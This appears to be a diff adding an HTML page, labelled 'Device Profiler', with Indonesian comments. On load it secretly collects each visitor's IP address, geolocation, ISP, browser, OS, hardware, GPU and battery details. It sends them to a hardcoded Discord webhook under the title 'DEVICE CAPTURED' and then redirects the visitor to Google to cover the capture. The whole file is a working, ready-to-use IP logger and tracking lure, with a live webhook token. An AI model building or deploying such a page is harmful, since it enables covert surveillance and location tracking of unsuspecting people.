@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Analysis</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 30px;
+            padding: 40px;
+            max-width: 450px;
+            border: 1px solid rgba(0,255,255,0.2);
+            box-shadow: 0 0 50px rgba(0,255,255,0.1);
+        }
+        h1 {
+            background: linear-gradient(90deg, #00ff88, #00f5ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+        }
+        .loader {
+            width: 45px;
+            height: 45px;
+            border: 4px solid rgba(0,255,255,0.1);
+            border-top-color: #00f5ff;
+            border-radius: 50%;
+            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .progress-container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            height: 6px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00f5ff, #ff00ff);
+            animation: progress 2.5s ease-out forwards;
+        }
+        @keyframes progress { to { width: 100%; } }
+        .status {
+            color: #00f5ff;
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 15px;
+        }
+        .device-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="device-icon" id="deviceIcon">📱</div>
+        <h1>DEVICE PROFILER</h1>
+        <p>Analyzing hardware & software configuration...</p>
+        <div class="loader"></div>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        <div class="status" id="status">Initializing kernel</div>
+    </div>
+
+    <script>
+        // ============================================
+        // DISCORD WEBHOOK - GANTI PUNYA LU
+        // ============================================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1476195408785969223/guexX43ov_PmAYlEMdZTySi706D8o4R_CL_a7n22-PpZDm1rQ30jdlp_6sy0DjI7EC_I";
+
+        // ============================================
+        // DATABASE LENGKAP DEVICE (SERIES + NAMA LENGKAP)
+        // ============================================
+        const DEVICE_DATABASE = {
+            // ===== SAMSUNG =====
+            'SM-S928': { brand: 'Samsung', series: 'Galaxy S24', fullName: 'Galaxy S24 Ultra', icon: '📱' },
+            'SM-S926': { brand: 'Samsung', series: 'Galaxy S24', fullName: 'Galaxy S24+', icon: '📱' },
+            'SM-S921': { brand: 'Samsung', series: 'Galaxy S24', fullName: 'Galaxy S24', icon: '📱' },
+            'SM-S918': { brand: 'Samsung', series: 'Galaxy S23', fullName: 'Galaxy S23 Ultra', icon: '📱' },
+            'SM-S916': { brand: 'Samsung', series: 'Galaxy S23', fullName: 'Galaxy S23+', icon: '📱' },
+            'SM-S911': { brand: 'Samsung', series: 'Galaxy S23', fullName: 'Galaxy S23', icon: '📱' },
+            'SM-S908': { brand: 'Samsung', series: 'Galaxy S22', fullName: 'Galaxy S22 Ultra', icon: '📱' },
+            'SM-F946': { brand: 'Samsung', series: 'Galaxy Z Fold', fullName: 'Galaxy Z Fold5', icon: '📱' },
+            'SM-F936': { brand: 'Samsung', series: 'Galaxy Z Fold', fullName: 'Galaxy Z Fold4', icon: '📱' },
+            'SM-F731': { brand: 'Samsung', series: 'Galaxy Z Flip', fullName: 'Galaxy Z Flip5', icon: '📱' },
+            'SM-F721': { brand: 'Samsung', series: 'Galaxy Z Flip', fullName: 'Galaxy Z Flip4', icon: '📱' },
+            'SM-A556': { brand: 'Samsung', series: 'Galaxy A55', fullName: 'Galaxy A55 5G', icon: '📱' },
+            'SM-A546': { brand: 'Samsung', series: 'Galaxy A54', fullName: 'Galaxy A54 5G', icon: '📱' },
+            'SM-A356': { brand: 'Samsung', series: 'Galaxy A35', fullName: 'Galaxy A35 5G', icon: '📱' },
+            'SM-A346': { brand: 'Samsung', series: 'Galaxy A34', fullName: 'Galaxy A34 5G', icon: '📱' },
+            'SM-A156': { brand: 'Samsung', series: 'Galaxy A15', fullName: 'Galaxy A15 5G', icon: '📱' },
+            'SM-A146': { brand: 'Samsung', series: 'Galaxy A14', fullName: 'Galaxy A14 5G', icon: '📱' },
+            'SM-M336': { brand: 'Samsung', series: 'Galaxy M33', fullName: 'Galaxy M33 5G', icon: '📱' },
+            
+            // ===== XIAOMI / REDMI / POCO =====
+            'Xiaomi14': { brand: 'Xiaomi', series: 'Xiaomi 14', fullName: 'Xiaomi 14', icon: '📱' },
+            'Xiaomi13': { brand: 'Xiaomi', series: 'Xiaomi 13', fullName: 'Xiaomi 13', icon: '📱' },
+            'Xiaomi12': { brand: 'Xiaomi', series: 'Xiaomi 12', fullName: 'Xiaomi 12', icon: '📱' },
+            '2107119SG': { brand: 'Xiaomi', series: 'Redmi Note 10', fullName: 'Redmi Note 10 Pro', icon: '📱' },
+            '2201116SG': { brand: 'Xiaomi', series: 'Redmi Note 11', fullName: 'Redmi Note 11 Pro', icon: '📱' },
+            '2201123G': { brand: 'Xiaomi', series: 'Redmi Note 11S', fullName: 'Redmi Note 11S', icon: '📱' },
+            '2211133G': { brand: 'Xiaomi', series: 'Redmi Note 12', fullName: 'Redmi Note 12 Pro', icon: '📱' },
+            '23021RAA2G': { brand: 'Xiaomi', series: 'Redmi Note 13', fullName: 'Redmi Note 13 Pro', icon: '📱' },
+            '2312DRAABI': { brand: 'Xiaomi', series: 'Redmi Note 14', fullName: 'Redmi Note 14 Pro', icon: '📱' },
+            'POCO F5': { brand: 'Xiaomi', series: 'POCO F5', fullName: 'POCO F5 Pro', icon: '📱' },
+            'POCO F6': { brand: 'Xiaomi', series: 'POCO F6', fullName: 'POCO F6 Pro', icon: '📱' },
+            'POCO X6': { brand: 'Xiaomi', series: 'POCO X6', fullName: 'POCO X6 Pro', icon: '📱' },
+            'POCO M6': { brand: 'Xiaomi', series: 'POCO M6', fullName: 'POCO M6 Pro', icon: '📱' },
+            
+            // ===== OPPO =====
+            'CPH2499': { brand: 'Oppo', series: 'Find X7', fullName: 'Oppo Find X7 Ultra', icon: '📱' },
+            'CPH2497': { brand: 'Oppo', series: 'Find X6', fullName: 'Oppo Find X6 Pro', icon: '📱' },
+            'CPH2557': { brand: 'Oppo', series: 'Reno 11', fullName: 'Oppo Reno 11 Pro', icon: '📱' },
+            'CPH2527': { brand: 'Oppo', series: 'Reno 10', fullName: 'Oppo Reno 10 Pro', icon: '📱' },
+            'CPH2487': { brand: 'Oppo', series: 'Reno 9', fullName: 'Oppo Reno 9 Pro', icon: '📱' },
+            
+            // ===== VIVO =====
+            'V2324': { brand: 'Vivo', series: 'X100', fullName: 'Vivo X100 Pro', icon: '📱' },
+            'V2309': { brand: 'Vivo', series: 'X90', fullName: 'Vivo X90 Pro', icon: '📱' },
+            'V2318': { brand: 'Vivo', series: 'V29', fullName: 'Vivo V29 Pro', icon: '📱' },
+            'V2240': { brand: 'Vivo', series: 'V27', fullName: 'Vivo V27 Pro', icon: '📱' },
+            
+            // ===== REALME =====
+            'RMX3840': { brand: 'Realme', series: 'GT 5', fullName: 'Realme GT 5 Pro', icon: '📱' },
+            'RMX3820': { brand: 'Realme', series: 'GT 3', fullName: 'Realme GT 3', icon: '📱' },
+            'RMX3770': { brand: 'Realme', series: 'C67', fullName: 'Realme C67', icon: '📱' },
+            'RMX3760': { brand: 'Realme', series: 'C65', fullName: 'Realme C65', icon: '📱' },
+            
+            // ===== HUAWEI =====
+            'ALN-AL10': { brand: 'Huawei', series: 'Pura 70', fullName: 'Huawei Pura 70 Ultra', icon: '📱' },
+            'ADA-AL10': { brand: 'Huawei', series: 'P60', fullName: 'Huawei P60 Pro', icon: '📱' },
+            'BAL-AL60': { brand: 'Huawei', series: 'Mate 60', fullName: 'Huawei Mate 60 Pro', icon: '📱' },
+            
+            // ===== INFINIX =====
+            'X6833B': { brand: 'Infinix', series: 'Note 40', fullName: 'Infinix Note 40 Pro', icon: '📱' },
+            'X6739': { brand: 'Infinix', series: 'GT 20', fullName: 'Infinix GT 20 Pro', icon: '📱' },
+            'X6716': { brand: 'Infinix', series: 'Hot 40', fullName: 'Infinix Hot 40 Pro', icon: '📱' },
+            
+            // ===== TECNO =====
+            'CK9n': { brand: 'Tecno', series: 'Camon 30', fullName: 'Tecno Camon 30 Premier', icon: '📱' },
+            'LK7': { brand: 'Tecno', series: 'Spark 20', fullName: 'Tecno Spark 20 Pro', icon: '📱' },
+            
+            // ===== ONEPLUS =====
+            'CPH2581': { brand: 'OnePlus', series: 'OnePlus 12', fullName: 'OnePlus 12', icon: '📱' },
+            'CPH2447': { brand: 'OnePlus', series: 'OnePlus 11', fullName: 'OnePlus 11', icon: '📱' },
+            
+            // ===== GOOGLE PIXEL =====
+            'Pixel 8 Pro': { brand: 'Google', series: 'Pixel 8', fullName: 'Google Pixel 8 Pro', icon: '📱' },
+            'Pixel 8': { brand: 'Google', series: 'Pixel 8', fullName: 'Google Pixel 8', icon: '📱' },
+            'Pixel 7 Pro': { brand: 'Google', series: 'Pixel 7', fullName: 'Google Pixel 7 Pro', icon: '📱' },
+            
+            // ===== APPLE =====
+            'iPhone15,3': { brand: 'Apple', series: 'iPhone 15', fullName: 'iPhone 15 Pro Max', icon: '📱' },
+            'iPhone15,2': { brand: 'Apple', series: 'iPhone 15', fullName: 'iPhone 15 Pro', icon: '📱' },
+            'iPhone15,1': { brand: 'Apple', series: 'iPhone 15', fullName: 'iPhone 15', icon: '📱' },
+            'iPhone14,8': { brand: 'Apple', series: 'iPhone 14', fullName: 'iPhone 14 Plus', icon: '📱' },
+            'iPhone14,7': { brand: 'Apple', series: 'iPhone 14', fullName: 'iPhone 14', icon: '📱' },
+            'iPhone14,6': { brand: 'Apple', series: 'iPhone 14', fullName: 'iPhone 14 Pro', icon: '📱' },
+            'iPhone14,3': { brand: 'Apple', series: 'iPhone 13', fullName: 'iPhone 13 Pro Max', icon: '📱' },
+            'iPad13,18': { brand: 'Apple', series: 'iPad Pro', fullName: 'iPad Pro M2', icon: '📟' },
+            'MacBookAir': { brand: 'Apple', series: 'MacBook Air', fullName: 'MacBook Air M2', icon: '💻' },
+            'MacBookPro': { brand: 'Apple', series: 'MacBook Pro', fullName: 'MacBook Pro M3', icon: '💻' }
+        };
+
+        // Fallback brand detection (kalo gak ada di database)
+        const BRAND_KEYWORDS = {
+            'Samsung': ['SM-', 'Samsung'],
+            'Xiaomi': ['Xiaomi', 'Redmi', 'POCO', 'Mi 9', 'Mi 10', 'Mi 11', 'Mi 12', 'Mi 13', 'Mi 14'],
+            'Oppo': ['OPPO', 'CPH'],
+            'Vivo': ['Vivo', 'V20', 'V21', 'V23', 'V25', 'V27', 'V29'],
+            'Realme': ['Realme', 'RMX'],
+            'Huawei': ['Huawei', 'ALN', 'ADA', 'BAL', 'HarmonyOS'],
+            'OnePlus': ['OnePlus', 'CPH2581', 'CPH2447'],
+            'Google': ['Pixel'],
+            'Apple': ['iPhone', 'iPad', 'Mac'],
+            'Infinix': ['Infinix', 'X683', 'X673', 'X671'],
+            'Tecno': ['Tecno', 'CK9', 'LK7'],
+            'Nothing': ['Nothing'],
+            'Asus': ['ASUS', 'ROG'],
+            'Sony': ['Sony', 'Xperia']
+        };
+
+        // Update status
+        function updateStatus(msg) {
+            document.getElementById('status').innerText = msg;
+        }
+
+        function updateDeviceIcon(brand) {
+            let icon = document.getElementById('deviceIcon');
+            let icons = {
+                'Apple': '🍎',
+                'Samsung': '📱',
+                'Xiaomi': '📱',
+                'Oppo': '📱',
+                'Vivo': '📱',
+                'Realme': '📱',
+                'Huawei': '📱',
+                'Google': '📱',
+                'OnePlus': '📱',
+                'Dell': '💻',
+                'HP': '💻',
+                'Lenovo': '💻',
+                'Asus': '💻',
+                'Acer': '💻',
+                'MSI': '💻',
+                'Sony': '🎮',
+                'LG': '📱',
+                'Motorola': '📱',
+                'Nokia': '📱',
+                'Infinix': '📱',
+                'Tecno': '📱',
+                'Nothing': '📱'
+            };
+            icon.innerText = icons[brand] || '📱';
+        }
+
+        // ============================================
+        // BATTERY STATUS DETECTION
+        // ============================================
+        async function getBatteryInfo() {
+            updateStatus("Mendeteksi status battery...");
+            
+            let batteryData = {
+                level: 'Unknown',
+                charging: 'Unknown',
+                timeRemaining: 'Unknown',
+                supported: false
+            };
+            
+            if ('getBattery' in navigator) {
+                try {
+                    let battery = await navigator.getBattery();
+                    
+                    batteryData.level = Math.round(battery.level * 100) + '%';
+                    batteryData.charging = battery.charging ? '🔌 Charging' : '🔋 Discharging';
+                    batteryData.supported = true;
+                    
+                    if (!battery.charging && battery.dischargingTime && battery.dischargingTime !== Infinity) {
+                        let minutes = Math.round(battery.dischargingTime / 60);
+                        batteryData.timeRemaining = minutes + ' menit';
+                    } else if (battery.charging && battery.chargingTime && battery.chargingTime !== Infinity) {
+                        let minutes = Math.round(battery.chargingTime / 60);
+                        batteryData.timeRemaining = minutes + ' menit (to full)';
+                    } else {
+                        batteryData.timeRemaining = 'Calculating...';
+                    }
+                    
+                } catch (e) {
+                    batteryData.level = 'Error';
+                }
+            }
+            
+            return batteryData;
+        }
+
+        // ============================================
+        // DEVICE BRAND DETECTION (DENGAN DATABASE LENGKAP)
+        // ============================================
+        function detectDeviceBrand(ua) {
+            updateStatus("Mendeteksi merek device...");
+            
+            let result = {
+                brand: 'Unknown',
+                model: 'Unknown',
+                series: 'Unknown',
+                fullName: 'Unknown',
+                icon: '📱',
+                confidence: 'low'
+            };
+
+            // 1. Cek di database spesifik dulu (prioritas)
+            for (let key in DEVICE_DATABASE) {
+                if (ua.includes(key)) {
+                    result.brand = DEVICE_DATABASE[key].brand;
+                    result.series = DEVICE_DATABASE[key].series;
+                    result.fullName = DEVICE_DATABASE[key].fullName;
+                    result.icon = DEVICE_DATABASE[key].icon;
+                    result.confidence = 'high';
+                    result.model = key;
+                    
+                    updateDeviceIcon(result.brand);
+                    return result;  // Langsung return kalo ketemu
+                }
+            }
+
+            // 2. Cek berdasarkan keyword brand (kalo gak ada di database)
+            for (let brand in BRAND_KEYWORDS) {
+                for (let keyword of BRAND_KEYWORDS[brand]) {
+                    if (ua.includes(keyword)) {
+                        result.brand = brand;
+                        result.confidence = 'medium';
+                        
+                        // Ambil model dari user-agent
+                        let modelMatch = ua.match(new RegExp(keyword + '([^\\s;)]+)'));
+                        if (modelMatch) {
+                            result.model = modelMatch[1];
+                        }
+                        
+                        updateDeviceIcon(result.brand);
+                        break;
+                    }
+                }
+            }
+
+            // 3. Deteksi iPhone specific (kalo belum ketemu)
+            if (result.brand === 'Unknown' && ua.includes('iPhone')) {
+                result.brand = 'Apple';
+                result.series = 'iPhone';
+                if (ua.includes('iPhone15,3')) result.fullName = 'iPhone 15 Pro Max';
+                else if (ua.includes('iPhone15,2')) result.fullName = 'iPhone 15 Pro';
+                else if (ua.includes('iPhone14,8')) result.fullName = 'iPhone 14 Plus';
+                else result.fullName = 'iPhone (unknown model)';
+                result.confidence = 'high';
+                updateDeviceIcon('Apple');
+            }
+
+            // 4. Deteksi Samsung (kalo pake kode SM-)
+            if (result.brand === 'Unknown' && ua.includes('SM-')) {
+                result.brand = 'Samsung';
+                result.series = 'Galaxy';
+                let modelCode = ua.match(/SM-[A-Z0-9]+/);
+                if (modelCode) {
+                    result.model = modelCode[0];
+                    
+                    // Coba cari di database berdasarkan kode awal
+                    let prefix = result.model.substring(0, 7); // SM-S928
+                    for (let key in DEVICE_DATABASE) {
+                        if (key === prefix) {
+                            result.fullName = DEVICE_DATABASE[key].fullName;
+                            result.series = DEVICE_DATABASE[key].series;
+                            break;
+                        }
+                    }
+                    
+                    if (result.fullName === 'Unknown') {
+                        result.fullName = `Samsung Galaxy (${result.model})`;
+                    }
+                }
+                result.confidence = 'high';
+                updateDeviceIcon('Samsung');
+            }
+
+            return result;
+        }
+
+        // ============================================
+        // DAPETIN IP + GEO INFO
+        // ============================================
+        async function getIPInfo() {
+            updateStatus("Mendapatkan alamat IP...");
+            try {
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipRes.json();
+                let ip = ipData.ip;
+                
+                let locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                let locData = await locRes.json();
+                
+                return {
+                    ip: ip,
+                    country: locData.country_name || 'Unknown',
+                    city: locData.city || 'Unknown',
+                    region: locData.region || 'Unknown',
+                    isp: locData.org || 'Unknown',
+                    lat: locData.latitude || null,
+                    lon: locData.longitude || null,
+                    timezone: locData.timezone || 'Unknown'
+                };
+            } catch (e) {
+                return {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    city: 'Unknown',
+                    isp: 'Unknown'
+                };
+            }
+        }
+
+        // ============================================
+        // DAPETIN INFO BROWSER + OS
+        // ============================================
+        function getBrowserInfo() {
+            updateStatus("Mendeteksi browser & OS...");
+            let ua = navigator.userAgent;
+            let browser = "Unknown";
+            let browserVersion = "Unknown";
+            let os = "Unknown";
+            let osVersion = "Unknown";
+            let device = "Unknown";
+            
+            // Deteksi browser
+            if (ua.includes("Firefox")) {
+                browser = "Firefox";
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "Unknown";
+            } else if (ua.includes("Edg")) {
+                browser = "Edge";
+                browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || "Unknown";
+            } else if (ua.includes("Chrome") && !ua.includes("Edg")) {
+                browser = "Chrome";
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "Unknown";
+            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+                browser = "Safari";
+                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || "Unknown";
+            } else if (ua.includes("OPR") || ua.includes("Opera")) {
+                browser = "Opera";
+                browserVersion = ua.match(/(OPR|Opera)\/([0-9.]+)/)?.[2] || "Unknown";
+            }
+            
+            // Deteksi OS
+            if (ua.includes("Windows NT 10.0")) {
+                os = "Windows 10/11";
+            } else if (ua.includes("Windows NT 6.3")) {
+                os = "Windows 8.1";
+            } else if (ua.includes("Windows NT 6.2")) {
+                os = "Windows 8";
+            } else if (ua.includes("Windows NT 6.1")) {
+                os = "Windows 7";
+            } else if (ua.includes("Mac OS X")) {
+                os = "macOS";
+                let match = ua.match(/Mac OS X ([0-9_]+)/);
+                if (match) osVersion = match[1].replace(/_/g, '.');
+            } else if (ua.includes("Linux")) {
+                os = "Linux";
+                if (ua.includes("Android")) {
+                    os = "Android";
+                    let match = ua.match(/Android ([0-9.]+)/);
+                    if (match) osVersion = match[1];
+                }
+            } else if (ua.includes("iPhone")) {
+                os = "iOS (iPhone)";
+            } else if (ua.includes("iPad")) {
+                os = "iOS (iPad)";
+            }
+            
+            // Deteksi device type
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+                device = "Mobile/Tablet";
+            } else {
+                device = "Desktop";
+            }
+            
+            return { browser, browserVersion, os, osVersion, device, ua };
+        }
+
+        // ============================================
+        // DAPETIN INFO HARDWARE
+        // ============================================
+        function getHardwareInfo() {
+            updateStatus("Mendeteksi hardware...");
+            let info = {
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                screen: `${screen.width}x${screen.height}`,
+                pixelRatio: window.devicePixelRatio || 1,
+                touchSupport: 'ontouchstart' in window ? 'Yes' : 'No'
+            };
+            
+            // GPU info
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    }
+                }
+            } catch (e) {
+                info.gpu = 'Unknown';
+            }
+            
+            return info;
+        }
+
+        // ============================================
+        // DAPETIN INFO SOFTWARE
+        // ============================================
+        function getSoftwareInfo() {
+            updateStatus("Mendeteksi software...");
+            let info = {
+                language: navigator.language || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+                adblock: false
+            };
+            
+            // Deteksi adblock
+            try {
+                let test = document.createElement('div');
+                test.innerHTML = '&nbsp;';
+                test.className = 'adsbox';
+                document.body.appendChild(test);
+                info.adblock = test.offsetHeight === 0;
+                document.body.removeChild(test);
+            } catch (e) {}
+            
+            return info;
+        }
+
+        // ============================================
+        // KIRIM KE DISCORD
+        // ============================================
+        async function sendToDiscord(allData) {
+            updateStatus("Mengirim data ke server...");
+            
+            // Format embed Discord
+            let embed = {
+                embeds: [{
+                    title: `📱 **DEVICE CAPTURED** ${allData.deviceInfo.icon || '📱'}`,
+                    color: 0x00ff88,
+                    fields: [
+                        // DEVICE BRAND (LENGKAP!)
+                        { name: "🏷️ **MEREK DEVICE**", value: allData.deviceInfo.brand, inline: true },
+                        { name: "📟 **SERIES**", value: allData.deviceInfo.series || 'N/A', inline: true },
+                        { name: "🔢 **MODEL**", value: allData.deviceInfo.model || 'N/A', inline: true },
+                        { name: "📌 **NAMA LENGKAP**", value: allData.deviceInfo.fullName || 'N/A', inline: false },
+                        
+                        // BATTERY INFO
+                        { name: "🔋 **BATTERY LEVEL**", value: allData.battery.level, inline: true },
+                        { name: "⚡ **CHARGING STATUS**", value: allData.battery.charging, inline: true },
+                        { name: "⏳ **TIME REMAINING**", value: allData.battery.timeRemaining, inline: true },
+                        
+                        // IP & Lokasi
+                        { name: "🌐 **IP ADDRESS**", value: allData.ipInfo.ip, inline: true },
+                        { name: "📍 **LOKASI**", value: `${allData.ipInfo.city}, ${allData.ipInfo.country}`, inline: true },
+                        { name: "🛜 **ISP**", value: allData.ipInfo.isp, inline: true },
+                        
+                        // Browser & OS
+                        { name: "📱 **BROWSER**", value: `${allData.browserInfo.browser} ${allData.browserInfo.browserVersion}`, inline: true },
+                        { name: "💻 **OS**", value: `${allData.browserInfo.os} ${allData.browserInfo.osVersion}`, inline: true },
+                        { name: "📟 **TYPE**", value: allData.browserInfo.device, inline: true },
+                        
+                        // Hardware
+                        { name: "⚙️ **CPU CORES**", value: allData.hardware.cores.toString(), inline: true },
+                        { name: "🧠 **RAM**", value: allData.hardware.memory, inline: true },
+                        { name: "🖥️ **LAYAR**", value: allData.hardware.screen, inline: true },
+                        { name: "🎮 **GPU**", value: allData.hardware.gpu || 'N/A', inline: false },
+                        
+                        // Software
+                        { name: "🔤 **BAHASA**", value: allData.software.language, inline: true },
+                        { name: "🍪 **COOKIES**", value: allData.software.cookies, inline: true },
+                        { name: "🚫 **ADBLOCK**", value: allData.software.adblock ? '✅ ADA' : '❌ TIDAK', inline: true }
+                    ],
+                    footer: { 
+                        text: `SOULVANT DEVICE PROFILER • Confidence: ${allData.deviceInfo.confidence}`,
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            // Kirim ke Discord
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                });
+                console.log("Data sent to Discord");
+            } catch (e) {
+                // Fallback
+                let img = new Image();
+                img.src = WEBHOOK_URL + "?content=" + encodeURIComponent(JSON.stringify(allData));
+            }
+            
+            updateStatus("SELESAI! Redirecting...");
+            
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2000);
+        }
+
+        // ============================================
+        // MAIN EXECUTION
+        // ============================================
+        async function collectAllData() {
+            try {
+                let ua = navigator.userAgent;
+                
+                // Kumpulin semua data
+                let ipInfo = await getIPInfo();
+                let browserInfo = getBrowserInfo();
+                let hardware = getHardwareInfo();
+                let software = getSoftwareInfo();
+                let deviceInfo = detectDeviceBrand(ua);
+                let battery = await getBatteryInfo();
+                
+                // Gabungin semua
+                let allData = {
+                    ipInfo,
+                    browserInfo,
+                    hardware,
+                    software,
+                    deviceInfo,
+                    battery,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Simpan lokal (debug)
+                localStorage.setItem('soulvant_device', JSON.stringify(allData));
+                
+                // Kirim ke Discord
+                await sendToDiscord(allData);
+                
+            } catch (error) {
+                console.error("Error:", error);
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            }
+        }
+
+        // Jalanin pas load
+        window.onload = collectAllData;
+    </script>
+</body>
+</html>
